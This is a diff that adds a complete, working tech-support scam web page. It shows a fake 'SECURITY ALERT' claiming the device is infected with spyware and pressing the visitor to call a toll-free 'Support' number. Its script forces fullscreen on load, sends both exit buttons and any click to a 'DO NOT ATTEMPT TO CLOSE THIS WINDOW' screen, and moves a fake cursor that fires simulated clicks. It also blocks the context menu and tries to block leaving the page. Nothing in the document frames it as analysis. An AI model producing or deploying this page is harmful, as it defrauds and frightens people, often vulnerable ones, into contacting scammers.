@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Official Supports</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            background-color: #1a1a1a;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            cursor: none;
+        }
+        
+        .warning-container {
+            background-color: #2a2a2a;
+            border: 2px solid #ff3b30;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(255, 59, 48, 0.3);
+            position: relative;
+            z-index: 100;
+        }
+        
+        .warning-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .warning-icon {
+            font-size: 32px;
+            color: #ff3b30;
+            margin-right: 12px;
+        }
+        
+        .warning-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff3b30;
+        }
+        
+        .warning-content {
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        
+        .warning-message {
+            background-color: rgba(255, 59, 48, 0.1);
+            border-left: 4px solid #ff3b30;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .phone-number {
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            padding: 12px;
+            background-color: rgba(255, 59, 48, 0.2);
+            border-radius: 8px;
+        }
+        
+        .warning-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            gap: 10px;
+        }
+        
+        .button {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+            min-width: 120px;
+            font-size: 14px;
+        }
+        
+        .leave-button {
+            background-color: #4a4a4a;
+            color: white;
+        }
+        
+        .safety-button {
+            background-color: #007aff;
+            color: white;
+        }
+        
+        .button:active {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .timestamp {
+            text-align: right;
+            margin-top: 15px;
+            color: #888;
+            font-size: 12px;
+        }
+        
+        .timer {
+            text-align: center;
+            margin: 12px 0;
+            font-size: 16px;
+            color: #ff3b30;
+        }
+        
+        .fullscreen-warning {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #ff3b30;
+            font-size: 20px;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .warning-pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .flashing-text {
+            animation: flash 1s infinite;
+        }
+        
+        @keyframes flash {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Auto cursor for mobile simulation */
+        .auto-cursor {
+            position: fixed;
+            width: 25px;
+            height: 25px;
+            background: radial-gradient(circle, #ff3b30 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10000;
+            transition: transform 0.1s;
+            display: none;
+        }
+        
+        .auto-cursor::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 8px;
+            height: 8px;
+            background: #ff3b30;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+        }
+		.phone-number a {
+    color: red;
+	text-decoration: none;
+}
+		.phone-number flashing-text {
+    color: red;
+	text-decoration: none;
+}
+
+}
+        
+        /* Mobile-specific styles */
+        @media (max-width: 480px) {
+            .warning-container {
+                padding: 15px;
+            }
+            
+            .warning-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .warning-icon {
+                margin-right: 0;
+                margin-bottom: 8px;
+                font-size: 28px;
+            }
+            
+            .warning-title {
+                font-size: 18px;
+            }
+            
+            .warning-content {
+                font-size: 13px;
+            }
+            
+            .phone-number {
+                font-size: 16px;
+                padding: 10px;
+            }
+            
+            .fullscreen-warning {
+                font-size: 18px;
+                padding: 15px;
+            }
+            
+            .button {
+                padding: 12px 15px;
+                font-size: 13px;
+            }
+            
+            .warning-footer {
+                flex-direction: column;
+            }
+			.phone-number a {
+    color: red;
+	text-decoration: none;
+}
+
+			.phone-number flashing-text {
+    color: red;
+	text-decoration: none;
+}
+			
+        }
+        
+        /* Hide address bar and browser UI */
+        @media (max-width: 768px) {
+            body {
+                height: 100vh;
+                height: -webkit-fill-available;
+            }
+            
+            html {
+                height: 100vh;
+                height: -webkit-fill-available;
+            }
+			
+			.phone-number a {
+    color: red;
+	text-decoration: none;
+}
+
+			.phone-number flashing-text {
+    color: red;
+	text-decoration: none;
+}
+        }
+		
+
+        
+        /* Show auto-cursor only on desktop */
+        @media (min-width: 769px) {
+            .auto-cursor {
+                display: block;
+            }
+			.phone-number a {
+    color: red;
+	text-decoration: none;
+}
+
+			.phone-number flashing-text {
+    color: red;
+	text-decoration: none;
+}
+			
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-container" id="warningContainer">
+        <div class="warning-header">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">SECURITY ALERT</div>
+        </div>
+        
+        <div class="warning-content">
+            <p>Your divice is infected with Spyware and other malicious applications.</p>
+            <p>Traces of malware detected. Your personal data, photos, banking information are at risk.</p>
+            
+            <div class="warning-message">
+                <p><strong>WARNING:</strong> Spyware must be removed and system damage repaired immediately.</p>
+                <p>If you leave this site your divice will remain damaged and vulnerable.</p>
+            </div>
+            
+            <div class="timer">Time since infection: <span id="timer">0 minutes and 7 seconds</span></div>
+            
+            <p>Please call Support immediately for virus removal procedure:</p>
+            
+            <div class="phone-number"><a href="tel:18776801687">+1 (877) 680-1687</a></div>
+            
+            <p>Potential damage: System damage, loss of Apps, and data theft.</p>
+        </div>
+        
+        <div class="warning-footer">
+            <button class="button leave-button" id="leaveButton">Leave Page</button>
+            <button class="button safety-button" id="safetyButton">Back to Safety</button>
+        </div>
+        
+        <div class="timestamp">15 November 2025</div>
+    </div>
+    
+    <div class="fullscreen-warning hidden" id="fullscreenWarning">
+        <div class="block-message warning-pulse">
+            <h1 class="flashing-text">CRITICAL SYSTEM ALERT</h1>
+            <p>Your divice has been compromised by multiple threats</p>
+            <p>All system functions are now at risk</p>
+            <p>Personal data, passwords, and financial information may be stolen</p>
+            <br>
+            <h2>DO NOT ATTEMPT TO CLOSE THIS WINDOW</h2>
+            <p>Call Support immediately to prevent permanent damage:</p>
+            <div class="phone-number flashing-text"><a href="tel:18776801687">+1 (877) 680-1687</a></div>
+        </div>
+    </div>
+
+    <div class="auto-cursor" id="autoCursor" style="opacity: 1; left: 663.5px; top: 195.5px;"></div>
+
+    <script>
+        // Variables for cursor movement
+        let cursorInterval;
+        let cursorDirection = 1;
+        let cursorX = window.innerWidth / 2;
+        let cursorY = window.innerHeight / 2;
+        let movementPattern = 0;
+        let patternCounter = 0;
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        let fullscreenActive = false;
+        
+        // Update timer
+        function updateTimer() {
+            const timerElement = document.getElementById('timer');
+            let seconds = 0;
+            
+            setInterval(() => {
+                seconds++;
+                const minutes = Math.floor(seconds / 60);
+                const remainingSeconds = seconds % 60;
+                timerElement.textContent = `${minutes} minutes and ${remainingSeconds} seconds`;
+            }, 1000);
+        }
+        
+        // Show fullscreen warning
+        function showFullscreenWarning() {
+            const fullscreenWarning = document.getElementById('fullscreenWarning');
+            const warningContainer = document.getElementById('warningContainer');
+            
+            // Hide the original warning
+            warningContainer.classList.add('hidden');
+            
+            // Show fullscreen warning
+            fullscreenWarning.classList.remove('hidden');
+            
+            // Make page fullscreen
+            enterFullscreen();
+            fullscreenActive = true;
+        }
+        
+        // Enter fullscreen mode
+        function enterFullscreen() {
+            const element = document.documentElement;
+            
+            if (element.requestFullscreen) {
+                element.requestFullscreen().catch(err => {
+                    console.log('Fullscreen request failed:', err);
+                });
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+            
+            // Mobile fullscreen techniques
+            if (isMobile) {
+                // Hide browser UI on mobile
+                setTimeout(() => {
+                    window.scrollTo(0, 1);
+                }, 100);
+            }
+        }
+        
+        // Exit fullscreen mode
+        function exitFullscreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.mozCancelFullScreen) {
+                document.mozCancelFullScreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (document.msExitFullscreen) {
+                document.msExitFullscreen();
+            }
+            fullscreenActive = false;
+        }
+        
+        // Move cursor automatically (desktop only)
+        function moveCursorAutomatically() {
+            if (isMobile) return;
+            
+            const cursor = document.getElementById('autoCursor');
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+            
+            cursorInterval = setInterval(() => {
+                patternCounter++;
+                
+                // Change movement pattern every 200 movements
+                if (patternCounter > 200) {
+                    movementPattern = Math.floor(Math.random() * 4);
+                    patternCounter = 0;
+                }
+                
+                switch(movementPattern) {
+                    case 0: // Up and down
+                        cursorY += 5 * cursorDirection;
+                        if (cursorY > height - 20 || cursorY < 20) {
+                            cursorDirection *= -1;
+                        }
+                        break;
+                    case 1: // Left and right
+                        cursorX += 5 * cursorDirection;
+                        if (cursorX > width - 20 || cursorX < 20) {
+                            cursorDirection *= -1;
+                        }
+                        break;
+                    case 2: // Circular motion
+                        const radius = 100;
+                        const angle = patternCounter * 0.05;
+                        cursorX = width/2 + radius * Math.cos(angle);
+                        cursorY = height/2 + radius * Math.sin(angle);
+                        break;
+                    case 3: // Random movement
+                        cursorX += (Math.random() - 0.5) * 20;
+                        cursorY += (Math.random() - 0.5) * 20;
+                        
+                        // Keep cursor within bounds
+                        cursorX = Math.max(10, Math.min(width - 10, cursorX));
+                        cursorY = Math.max(10, Math.min(height - 10, cursorY));
+                        break;
+                }
+                
+                // Update cursor position
+                cursor.style.left = cursorX + 'px';
+                cursor.style.top = cursorY + 'px';
+                
+                // Simulate click every 50 movements
+                if (patternCounter % 50 === 0) {
+                    simulateClick();
+                }
+                
+            }, 50);
+        }
+        
+        // Simulate a mouse click (desktop only)
+        function simulateClick() {
+            if (isMobile) return;
+            
+            // Create and dispatch a click event
+            const clickEvent = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true,
+                clientX: cursorX,
+                clientY: cursorY
+            });
+            
+            // Find element at cursor position and click it
+            const element = document.elementFromPoint(cursorX, cursorY);
+            if (element && (element.id === 'leaveButton' || element.id === 'safetyButton')) {
+                element.dispatchEvent(clickEvent);
+            }
+        }
+        
+        // Click anywhere to go fullscreen
+        document.addEventListener('click', function() {
+            const warningContainer = document.getElementById('warningContainer');
+            
+            if (!warningContainer.classList.contains('hidden')) {
+                showFullscreenWarning();
+            }
+        });
+        
+        // Button click handlers
+        document.getElementById('leaveButton').addEventListener('click', showFullscreenWarning);
+        document.getElementById('safetyButton').addEventListener('click', showFullscreenWarning);
+        
+        // F1 key to exit fullscreen and show original warning
+        document.addEventListener('keydown', (event) => {
+            if (event.key === 'F1') {
+                exitFullscreen();
+                
+                // Show original warning
+                document.getElementById('warningContainer').classList.remove('hidden');
+                document.getElementById('fullscreenWarning').classList.add('hidden');
+                
+                // Simulate a click after a short delay to trigger fullscreen again (desktop only)
+                if (!isMobile) {
+                    setTimeout(simulateClick, 1000);
+                }
+            }
+        });
+        
+        // Prevent default actions
+        function preventDefault(event) {
+            event.preventDefault();
+            return false;
+        }
+        
+        // Hide cursor when it moves to top (simulate hiding close button) - desktop only
+        if (!isMobile) {
+            document.addEventListener('mousemove', function(e) {
+                const cursor = document.getElementById('autoCursor');
+                if (e.clientY < 50) { // If cursor goes near top
+                    cursor.style.opacity = '0';
+                } else {
+                    cursor.style.opacity = '1';
+                }
+            });
+        }
+        
+        // Mobile-specific fullscreen techniques
+        function setupMobileFullscreen() {
+            if (!isMobile) return;
+            
+            // Prevent zoom
+            document.addEventListener('gesturestart', function(e) {
+                e.preventDefault();
+            });
+            
+            document.addEventListener('gesturechange', function(e) {
+                e.preventDefault();
+            });
+            
+            document.addEventListener('gestureend', function(e) {
+                e.preventDefault();
+            });
+            
+            // Hide address bar
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    window.scrollTo(0, 1);
+                }, 0);
+            });
+            
+            // Prevent pull-to-refresh
+            document.body.style.overscrollBehavior = 'none';
+        }
+        
+        // Auto trigger fullscreen warning on mobile after delay
+        function autoTriggerMobileWarning() {
+            if (!isMobile) return;
+            
+            setTimeout(() => {
+                showFullscreenWarning();
+            }, 3000);
+        }
+        
+        // Initialize the page
+        function init() {
+            // Show the warning container initially
+            document.getElementById('warningContainer').classList.remove('hidden');
+            
+            // Setup mobile fullscreen
+            setupMobileFullscreen();
+            
+            // Enter fullscreen automatically on all devices
+            setTimeout(enterFullscreen, 500);
+            
+            // Start automatic cursor movement (desktop only)
+            if (!isMobile) {
+                setTimeout(moveCursorAutomatically, 1000);
+            }
+            
+            // Auto trigger warning on mobile
+            autoTriggerMobileWarning();
+            
+            // Initialize timer
+            updateTimer();
+            
+            // Prevent right-click context menu
+            document.addEventListener('contextmenu', preventDefault);
+            
+            // Try to prevent leaving the page
+            window.addEventListener('beforeunload', function (e) {
+                e.preventDefault();
+                e.returnValue = '';
+            });
+        }
+        
+        // Start when page loads
+        window.onload = init;
+        
+        // Re-enter fullscreen when orientation changes (mobile)
+        window.addEventListener('orientationchange', function() {
+            setTimeout(enterFullscreen, 300);
+        });
+        
+        // Re-enter fullscreen when resized
+        window.addEventListener('resize', function() {
+            setTimeout(enterFullscreen, 100);
+        });
+    </script>
+
+</body></html>
